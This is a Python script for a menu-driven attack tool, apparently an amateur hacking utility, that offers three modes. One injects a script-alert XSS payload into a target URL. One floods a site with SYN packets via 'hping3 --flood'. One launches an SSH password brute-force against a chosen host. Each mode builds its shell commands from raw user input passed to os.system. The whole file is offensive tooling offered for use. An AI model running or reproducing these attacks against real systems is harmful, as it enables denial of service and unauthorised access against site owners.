import urllib.request  as urllib2 
import re
import sys,os
import random

H = '\033[95m'
B = '\033[94m'
G = '\033[92m'
W = '\033[93m'
F = '\033[91m'
E = '\033[0m'
U = '\033[4m'
O = '\033[33m'


def XXS():
	os.system('clear')
	print('Enter site:')
	try:
		site = input(B+'Main»XXS»'+E) 
	except:
		print(F+'\nError'+E)
		
	if "http://" not in site and "https://"not in site:
		site = 'http://' + site
	else:
		pass

	if "query=" not in site:
		print(F+'[!]'+E+' Site dont have id parametrs')
	else:
		print(W+'[*]'+G+' Site '+site+' have "id" param')
	
	try:
		res = urllib2.urlopen(site)
	except:
		print(F+'[!] Site not work'+E)
		exit()
	
	try:
		print(W+'[+]'+G+' Site work'+E)
		scr = '<script>alert(111111111111111111111)</script>'
		site_xxs = site+scr
		res = urllib2.urlopen(site_xxs)
		info = res.info()
		print('################Info################\n')
		print(info)
		print('####################################\n')
		text = res.read()

		if "111111111111111111111" not in str(text):
			print(F+'[!]'+' Site not have XXs '+E)
			exit()
		else:
			print(U+W+'[++]'+B+' Site '+site +' have xxs vulnerability'+E)
			print(W+'Payload: '+G+site_xxs+E)
			sys.exit(1)
	except:
		exit()

def Dos():
	os.system('clear')
	
	print('Enter site:')
	site = input(B+'Dos»'+E)
	print('''Enter level:
		1) High dos
		2) Dos port
 		3) Low dos''')
	level = int(input(B+'Main»Dos»Level»'+E))
	if level == 1:
		os.system('hping3 -S -P --flood -V '+site)
	if level == 2:
		port = input(B+'Main»Dos»Level»Port»'+E)
		os.system('hping3 -S -P --flood -V -p '+port+' '+ site)
	if level == 3:
		os.system('python3 modules/dos.py '+site)

def SSH_Brut():
	os.system('clear')
	try:
		print(F+'Brutforse ssh mode!!'+E)
		print('Enter target host:')
		host = input(W+'Main»SSH»Host»'+E)
		print(G+'Enter username:'+E)
		print(G+'Default: admin'+E)
		user = input(W+'Main»SSH»User»'+E)
		if user == "":
			user = 'admin'
		print(G+'Enter password file:'+E)
		password = input(W+'Main»SSH»Password»'+E)

		if password == "":
			print('Enter password file')
			sys.exit(1)
		os.system('python3 modules/ssh.py '+host+' '+user+' '+password)
	except:
		print(F+' User aborting !!')
		exit()

def Main_Menu():
	print('\n')
	print(B+'''
	Menu sites:
  	'''+E+'''
  	1) XXS
 	2) Dos site 
  	3) Brute SSH
  	'''+W+'''-------------------\n'''+E)
	try:
		v = input('Main-»')
	except:
		print(' Good by ')
		exit()
	
	if v == 'help':
		info()
	elif int(v) == 1:
		XXS()
	elif int(v) == 2:
		Dos()
	elif int(v) == 3:
		SSH_Brut()
	else:
		print(F+'[!]'+' You entered an incorrect value '+E)
		exit()
Main_Menu()
